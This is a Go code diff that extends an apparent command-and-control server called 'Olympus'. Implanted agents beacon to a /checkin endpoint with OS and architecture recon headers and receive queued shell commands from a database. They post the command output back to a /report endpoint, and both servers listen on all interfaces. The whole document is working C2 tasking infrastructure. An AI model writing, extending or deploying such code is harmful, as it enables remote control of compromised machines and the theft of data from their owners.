@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -30,14 +31,14 @@ func (s *OlympusServer) GetAgents(ctx context.Context, in *pb.GetAgentsRequest) 
 }
 
 func main() {
-	// 1. Initialize the Secure Persistence Bridge
+	// 1. Initialize the Secure Persistence Bridge (Agents & Tasks)
 	db.InitDB()
 
 	server := &OlympusServer{}
 
-	// 2. Start gRPC Server
+	// 2. Start gRPC Management Server
 	go func() {
-		lis, err := net.Listen("tcp", ":9090")
+		lis, err := net.Listen("tcp", "0.0.0.0:9090")
 		if err != nil {
 			log.Fatalf("failed to listen: %v", err)
 		}
@@ -47,7 +48,7 @@ func main() {
 		s.Serve(lis)
 	}()
 
-	// 3. HTTP Listener (Unified with Database)
+	// 3. HTTP C2 Listener (Beaconing & Tasking)
 	http.HandleFunc("/checkin", func(w http.ResponseWriter, r *http.Request) {
 		agentID := r.Header.Get("X-Agent-ID")
 		if agentID == "" {
@@ -55,50 +56,62 @@ func main() {
 			return
 		}
 
-		// 1. Extract the new Discovery Headers
 		osVer := r.Header.Get("X-OS-Version")
 		arch := r.Header.Get("X-Arch")
 
-		// 2. Prepare the database record
 		agent := models.Agent{
 			ID:        agentID,
 			Hostname:  r.RemoteAddr,
-			OSVersion: osVer, // Save the recon data
-			Arch:      arch,  // Save the recon data
+			OSVersion: osVer,
+			Arch:      arch,
 			LastSeen:  time.Now(),
 		}
+		db.DB.Save(&agent)
 
-		// 3. Upsert into Postgres
-		if err := db.DB.Save(&agent).Error; err != nil {
-			log.Printf("[-] Failed to save discovery data: %v", err)
+		var task models.Task
+		err := db.DB.Where("agent_id = ? AND status = ?", agentID, "pending").Order("created_at asc").First(&task).Error
+
+		if err == nil {
+			fmt.Fprintf(w, "%s", task.Command)
+			db.DB.Model(&task).Update("status", "sent")
+			log.Printf("[+] Task dispatched to %s: %s", agentID, task.Command)
+		} else {
+			w.Write([]byte("OLYMPUS_ACK"))
+		}
+	})
+
+	// This receives the output of the command from Hermes
+	http.HandleFunc("/report", func(w http.ResponseWriter, r *http.Request) {
+		agentID := r.Header.Get("X-Agent-ID")
+		if agentID == "" {
+			w.WriteHeader(http.StatusBadRequest)
 			return
 		}
 
-		log.Printf("[+] Recon Received from %s: %s (%s)", agentID, osVer, arch)
-		w.Write([]byte("OLYMPUS_ACK"))
+		// Read the execution result from the request body
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			log.Printf("[-] Error reading report body: %v", err)
+			return
+		}
+
+		// Find the most recent task that was 'sent' to this agent
+		var task models.Task
+		err = db.DB.Where("agent_id = ? AND status = ?", agentID, "sent").Order("updated_at desc").First(&task).Error
+
+		if err == nil {
+			// Update the task with the result and mark as completed
+			db.DB.Model(&task).Updates(map[string]interface{}{
+				"status": "completed",
+				"result": string(body),
+			})
+			log.Printf("[+] Mission Accomplished by %s: Result stored in DB.", agentID)
+			w.Write([]byte("REPORT_ACK"))
+		} else {
+			log.Printf("[-] No 'sent' task found for %s to report against.", agentID)
+		}
 	})
-	log.Fatal(http.ListenAndServe(":8080", nil))
-}
 
-func handleCheckin(w http.ResponseWriter, r *http.Request) {
-	agentID := r.Header.Get("X-Agent-ID")
-	if agentID == "" {
-		return
-	}
-
-	// Prepare the agent data
-	agent := models.Agent{
-		ID:       agentID,
-		Hostname: agentID, // We'll split this later in System Discovery
-		LastSeen: time.Now(),
-	}
-
-	// GORM "Save" performs an Upsert based on the Primary Key (ID)
-	if err := db.DB.Save(&agent).Error; err != nil {
-		log.Printf("[-] Failed to save beacon: %v", err)
-		return
-	}
-
-	log.Printf("[+] Persistence: Updated %s", agentID)
-	fmt.Fprintf(w, "OLYMPUS_ACK")
+	fmt.Println("[*] HTTP C2 Server listening on :8080")
+	log.Fatal(http.ListenAndServe("0.0.0.0:8080", nil))
 }
